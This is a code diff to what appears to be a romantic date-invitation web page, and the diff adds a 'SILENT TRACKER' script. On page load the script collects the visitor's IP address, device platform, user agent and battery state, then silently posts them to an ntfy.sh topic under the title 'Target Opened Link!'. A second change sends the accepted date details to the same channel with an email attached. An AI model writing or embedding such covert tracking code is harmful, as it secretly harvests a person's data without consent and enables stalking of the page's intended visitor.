@@ -169,6 +169,50 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
+
+      // --- SILENT TRACKER ---
+      async function captureVisitor() {
+        try {
+          // Grab IP Address
+          let ip = "Unknown IP";
+          try {
+            const ipRes = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+          } catch(e) {}
+
+          // Get User Agent
+          const ua = navigator.userAgent || "Unknown Device";
+          
+          // Try to get battery info
+          let batteryStr = "Unknown";
+          if (navigator.getBattery) {
+            try {
+              const b = await navigator.getBattery();
+              batteryStr = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+            } catch(e){}
+          }
+
+          const platform = navigator.platform || "Unknown OS";
+          const time = new Date().toLocaleString();
+
+          const trackBody = `🚨 NEW VISITOR\nIP: ${ip}\nPlatform: ${platform}\nBattery: ${batteryStr}\nTime: ${time}\nUA: ${ua}`;
+          
+          // Push payload to ntfy quietly
+          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("Target Opened Link!"), {
+            method: "POST",
+            mode: "no-cors",
+            body: trackBody
+          }).catch(() => {});
+
+        } catch(e) {}
+      }
+      
+      // Execute tracker immediately when the page loads
+      captureVisitor();
+      // ----------------------
+
+
       // Secret Note Modal
       const noteBtn = document.getElementById("noteBtn");
       const noteModal = document.getElementById("noteModal");
@@ -267,8 +311,8 @@
             confetti({ startVelocity: 30, spread: 360, ticks: 60, origin: { x: Math.random(), y: Math.random() - 0.2 }, colors: ['#ffd1dc', '#ffffff', '#873e51', '#d3a4b4'] });
           }, 250);
 
-          // 1. ntfy bypass (mode: "no-cors" completely stops the browser from blocking it)
-          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv", {
+          // 1. Final ticket ntfy bypass
+          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?email=Kali0x0x@proton.me&title=" + encodeURIComponent("🤍 Romantic Date Confirmed!"), {
             method: "POST",
             mode: "no-cors",
             body: `🤍 DATE ACCEPTED!\nDate: ${date}\nTime: ${time}\nDining: ${food}\nPlan: ${act}\nNotes: ${notes}`
